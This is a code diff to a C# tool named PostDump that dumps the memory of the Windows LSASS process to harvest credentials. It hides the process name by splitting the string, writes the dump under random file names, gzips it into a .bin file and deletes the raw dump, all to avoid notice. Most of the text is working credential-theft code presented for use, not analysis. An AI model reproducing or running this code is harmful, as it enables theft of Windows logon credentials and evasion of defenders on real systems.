@@ -15,6 +15,8 @@ using PMINIDUMP_CALLBACK_OUTPUT = System.IntPtr;
 using PMINIDUMP_EXCEPTION_INFORMATION = System.IntPtr;
 using PMINIDUMP_USER_STREAM_INFORMATION = System.IntPtr;
 using PMINIDUMP_CALLBACK_INFORMATION = System.IntPtr;
+using System.IO.Compression;
+using System.Linq;
 
 namespace PostDump
 {
@@ -86,18 +88,52 @@ namespace PostDump
             }
         }
 
+        //https://github.com/GhostPack/SharpDump/blob/master/SharpDump/Program.cs#L26
+        public static void Compress(string inFile, string outFile)
+        {
+            try
+            {
+                if (File.Exists(outFile))
+                {
+                    Console.WriteLine("[X] Output file '{0}' already exists, removing", outFile);
+                    File.Delete(outFile);
+                }
+
+                var bytes = File.ReadAllBytes(inFile);
+                using (FileStream fs = new FileStream(outFile, FileMode.CreateNew))
+                {
+                    using (GZipStream zipStream = new GZipStream(fs, CompressionMode.Compress, false))
+                    {
+                        zipStream.Write(bytes, 0, bytes.Length);
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine("[X] Exception while compressing file: {0}", ex.Message);
+            }
+        }
+
+        private static Random random = new Random();
+
+        public static string RandomString(int length)
+        {
+            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+            return new string(Enumerable.Repeat(chars, length)
+                .Select(s => s[random.Next(s.Length)]).ToArray());
+        }
 
         static void Main(string[] args)
         {
 
             string ProcName = "l" + "sa" + "ss";
-            string path = Directory.GetCurrentDirectory();
-            string FilePath = path + "\\yolo.log";
-            FileStream dumpFile = new FileStream(FilePath, FileMode.Create);
-
 
             Process[] proc = Process.GetProcessesByName(ProcName);
             IntPtr proc_pid = (IntPtr)(proc[0].Id);
+            string currPath = Directory.GetCurrentDirectory();
+            string FilePath = String.Format("{0}\\{1}.log", currPath, RandomString(7));
+            string zipFile = String.Format("{0}\\{1}.bin", currPath, RandomString(7));
+            FileStream dumpFile = new FileStream(FilePath, FileMode.Create);
             //IntPtr proc_pid = (IntPtr)uint.Parse(args[0]);
 
             IntPtr proc_handle = IntPtr.Zero;
@@ -216,7 +252,10 @@ namespace PostDump
             {
                 var info = new FileInfo(FilePath);
                 Console.WriteLine($"Duplicate dump successful. Dumped {info.Length} bytes to: " + FilePath);
-
+                dumpFile.Close();
+                Console.WriteLine($"Compressing file to gzip format and deleting old file, new file: " + zipFile);
+                Compress(FilePath, zipFile);
+                File.Delete(FilePath);
             }
             else
             {
